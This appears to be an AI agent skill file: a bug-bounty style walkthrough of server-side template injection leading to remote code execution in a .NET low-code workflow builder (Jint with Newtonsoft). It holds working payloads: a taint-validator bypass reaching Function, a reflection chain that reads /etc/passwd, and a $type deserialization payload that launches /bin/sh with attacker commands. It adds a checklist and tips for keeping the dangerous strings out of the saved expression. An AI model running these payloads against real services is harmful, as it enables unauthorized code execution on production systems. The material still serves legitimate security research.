---
name: dotnet-ssti-rce
description: .NET server-side template injection (SSTI) to remote code execution in low-code / automation / workflow builders that evaluate {{ }} templates server-side with an embedded JS interpreter (Jint). Covers: fingerprinting the engine, reaching the live CLR object, bypassing save-time AST validators (taint tracking), surviving Jint MaxStatements, reaching System.Type, and the Jint→Newtonsoft TypeNameHandling coercion RCE (constructor-argument coercion enabling $type deserialization). Also a general lesson set: enumerate the surface instead of deducing it, and re-test fixes as fresh leads. Triggers on: "SSTI", "{{ }} server-side template", "automation builder", "workflow engine", "Jint", "low-code", "HttpRequest step", server-side template injection in .NET, or an expression evaluator that runs on the server.
---

# .NET SSTI → RCE in low-code automation/workflow builders (Jint + Newtonsoft)

A full chain: from a `{{ }}` template in a server-side step type (e.g. HttpRequest),
to arbitrary command execution on the production pod — from a free self-signup
account. The interesting part is the two "impossible" conclusions that were wrong,
and what corrected them (enumerating, then finding the correct axis).

## Step 0 — recognize the surface

A low-code builder's step fields accept templates: anything between `{{ }}` is
evaluated ON THE SERVER when the workflow runs.

```json
"outputs": {"o": "{{ step.ResponseCode }}"}
```

This is **server-side template injection** if the evaluator can reach more than a
data dictionary. The first question is always: **what engine evaluates it, and what
objects are in scope?**

- Fingerprint the engine. Here: **Jint 4.9.0** (a JS interpreter embedded in .NET).
- Probe what's injected into the template scope:
  ```js
  {{ ''+step }}   ->   Wavecell.Automation.Core.Steps.HttpRequest
  ```
  `step` is NOT a data dictionary — it is the **live .NET object** for the step
  (with `Url`, `Headers`, `ResponseBody`, `RunAsync`), writable:
  ```js
  Reflect.set(step,'Url', ...)   // changes the outgoing URL after validation
  ```

**Takeaway 1:** in a low-code product, don't ask "is there SSTI?", ask **"what
exactly is in scope?"** A live CLR object in scope changes everything.

## Jint interop model (what the safe defaults hide)

Jint has switches:
- `AllowClr(false)` — no `clr`/`System`/`importNamespace` bridge
- `AllowGetType=false` — hides any member named `GetType`
- `AllowSystemReflection=false` — refuses to wrap objects whose namespace starts
  with `System.Reflection`

8x8 ran defaults and injected `data` (ExpandoObject) + `step` (the step object).
Key nuance: **`System.Type` lives in namespace `System`, NOT `System.Reflection`**,
so the namespace block does NOT stop a `Type` object once you can reach one.

If you hold a `System.Type` in .NET you have the skeleton key:
```csharp
type.InvokeMember("ReadAllText", flags, null, null, new object[]{ "/etc/passwd" });
```
The method name is a runtime string → name-based filters never see it. And
`Type.GetType("System.Diagnostics.Process")` resolves any loaded type.

## Bypassing the save-time AST validator

A custom validator with data-flow / taint tracking blocks: `function`, arrows,
classes, object literals `{}`, all assignment forms, backticks, `eval`,
`Function('...')`. It follows taint through `[].constructor.constructor` →
`Function` reached then called via `.call/.apply/Reflect.apply/[Fn][0]/.pop/Map.get(0)`.

It LETS through: `x++`, `delete`, comma operator, `Reflect.set`, `Reflect.get`,
`Object.defineProperty`, `new`, `.map/.find/.sort`.

**The bypass** (reaches Function via a METHOD CALL the taint tracker doesn't follow,
and carries the real code as a runtime value from the un-validated trigger body):
```js
Reflect.apply( Reflect.get([].constructor,'constructor'), null, [data.code] )
```
`data.code` comes from the trigger body (never save-validated) → no string literal
appears in the saved expression. `typeof` = "function".

## The wall: Jint MaxStatements

Creating the function fit; CALLING it did not (even an empty body). Splitting
create/call across outputs doesn't help (budget is cumulative per workflow).
Hooks the engine calls itself with a fresh counter: `toJSON` never fires under
Jint/Newtonsoft; a getter via `Object.defineProperty` DID execute but fires so late
only a constant fits (`return 6*7*10101` already blew the budget).

## Reaching System.Type (the first real gadget)

Deduction alone was wrong ("no reachable Type source"). **Enumerate** instead:
- `step.ResponseBody` is a **Newtonsoft JObject** (parsed HTTP response).
- `JObject.CreateReader()` returns a **JsonReader**.
- `JsonReader.ValueType` returns the **System.Type** of the current token.
  - not named `GetType` (name filter misses it)
  - not in `System.Reflection` (namespace block misses it)
  - it was exposed the whole time by the object the app injected

Chain (every dangerous string arrives via the trigger body; `Reflect.set` stores
intermediates because `=` is blocked; 276/344/280 are BindingFlags that Jint coerces
from a JS number):
```js
{{(Reflect.set(data,'r', step.ResponseBody.slideshow.CreateReader()),
   data.r.Read(), data.r.Read(), data.r.Read(),
   Reflect.set(data,'st', data.r.ValueType),                       // System.Type of String
   Reflect.set(data,'ot', data.st.BaseType),                       // System.Object
   Reflect.set(data,'rtt', data.ot.InvokeMember(data.getType,276,null,data.st,[])),   // System.RuntimeType
   Reflect.set(data,'ft', data.rtt.InvokeMember(data.getType,344,null,null,[data.fileT])),
   ''+data.ft.InvokeMember(data.readAll,280,null,null,[data.p1]))}}
```

**Takeaway 2:** enumerate the surface, don't deduce it. Both "definitive" wrong
conclusions were a pretty argument with no member listing. Enumerating the objects
actually in scope found `ValueType`.

## Retesting the fix — and finding the real bug axis

After the first report, 8x8 filtered `reader.ValueType` (now undefined), but
`step.ResponseBody` is STILL a raw JObject, `CreateReader` still exists, the CLR
object is still in scope, and the validator still saves the gadget (201).

- A `MemberFilter` that only blocks `ValueType` would miss the accessor
  `get_ValueType()` — the lab showed `get_ValueType()` returns the Type under a
  naive filter; production blocked both property AND accessor (while
  `get_TokenType`, `get_Value`, `get_Culture` stayed). So the filter was narrow and
  correct for the reflection axis.
- Enumeration across the whole CLR closure reached reflection primitives only via
  `ValueType` (filtered), `Enum.GetUnderlyingType` (needs a Type arg — circular),
  `Task.Exception.TargetSite` (dead: Jint auto-awaits Tasks). Conclusion: no
  reflection bypass. **Correct on that axis, wrong overall** — the real bypass uses
  no reflection.

**Takeaway 3:** a fix is a *fresh lead*, not a closure. It shows where they think
the bug was. A narrow fix over an intact root cause means the door is still open.

## The real bug: Jint→Newtonsoft argument-coercion TypeNameHandling

- `$type` in Newtonsoft: `{"$type":"MyApp.Order, MyApp","total":10}` only handled
  when `TypeNameHandling != None`. Over attacker-controlled JSON it's the classic
  .NET insecure-deserialization RCE (ysoserial.net gadget catalog).
- Ruled out because `JToken.Parse(text)` ignores `$type` (verified: no instantiation).
  **BUT** re-deserializing that same tree through a serializer WITH TypeNameHandling
  on DOES honor `$type`.

**The overload confusion.** `JToken.ToObject` overloads:
```csharp
object ToObject(Type objectType);
T      ToObject<T>(JsonSerializer jsonSerializer);
object ToObject(Type objectType, JsonSerializer jsonSerializer);
```
Called from JS with ONE JObject argument, Jint picks `ToObject<T>(JsonSerializer)`.
Jint's default converter sees a string-keyed dictionary → `Activator.CreateInstance(
JsonSerializer)` and assigns each key as a property. One property is
`TypeNameHandling` (an enum; Jint converts a JS number to an enum silently). So:
```json
"cfg": {"TypeNameHandling": 3}
```
configures a `JsonSerializer` with `TypeNameHandling.All`, then `ToObject`
re-deserializes the (attacker-owned) tree honoring `$type`.

## The final payload

Serve (HTTP step fetches the URL) — here httpbin.org/base64/<base64> returns the
decoded body:
```json
{"payload":{"$type":"System.Diagnostics.Process, System.Diagnostics.Process"},
 "psi":{"$type":"System.Diagnostics.ProcessStartInfo, System.Diagnostics.Process",
        "FileName":"/bin/sh","ArgumentList":["-c","id; hostname; uname -sm; head -2 /etc/os-release"],
        "RedirectStandardOutput":true,"UseShellExecute":false},
 "cfg":{"TypeNameHandling":3}}
```
Output template (single expression):
```js
{{''+step.ResponseBody.payload.ToObject(step.ResponseBody.cfg)
      .Start(step.ResponseBody.psi.ToObject(step.ResponseBody.cfg))
      .StandardOutput.ReadToEnd()}}
```
RCE: `Process` via `$type`, `.Start(psi)` reaches static
`Process.Start(ProcessStartInfo)` off the instance wrapper, `.StandardOutput.ReadToEnd()`
reads stdout. The saved expression contains NO type name, command, function, `=`,
`{`, or `;` — every dangerous string comes from the HTTP response fetched AFTER
save time, so the validator sees an innocent member-access expression.
`Process.Start` returns a `Process`, not a `System.Type`, so the fix's MemberFilter
is never consulted. Result on the pod: `uid=1000(wcapp)` + hostname + Alpine.

## Reusable checks for any {{ }} evaluator (checklist)

1. **Enumerate the in-scope objects' members** (don't deduce): `''+obj` names the
   type; enumerate the CLR closure (the step object, response bodies,
   configuration objects) member-by-member.
2. **Test every member set that touches a `System.Type`** by a name OTHER than
   `GetType`, and outside `System.Reflection` — e.g. `JsonReader.ValueType`.
3. **Test the serializer/deserializer bridge**: any `ToObject`/`FromObject`/
   deserialize overload reachable from the template scope, with attacker-controlled
   JSON. Look for **argument coercion** — a JS object → config object
   (`TypeNameHandling: 3`) is a huge primitive. Then `$type` honors
   TypeNameHandling even when `Parse` ignored it.
4. **Fix = retest.** Map exactly what changed; a narrow fix (member filter) over an
   intact root cause (serializer coercion, live CLR object) means retry on a
   different axis. Verify both property and `get_Xxx()` accessor are filtered (or not).
5. Test `Reflect.set` / writable step members — can you mutate `Url`/config after
   validation?

## Gotchas
- Jint default converter doing `Activator.CreateInstance` + property assignment from
  a JS dictionary is an entire overlooked surface (config-object injection).
- `TypeNameHandling` over attacker-controlled JSON is still RCE even in 2026 —
  here it wasn't enabled in code, the attacker enabled it by passing a number.
- Carry danger strings in the runtime body (trigger data / HTTP response fetched
  post-save) so the saved expression stays validator-clean.
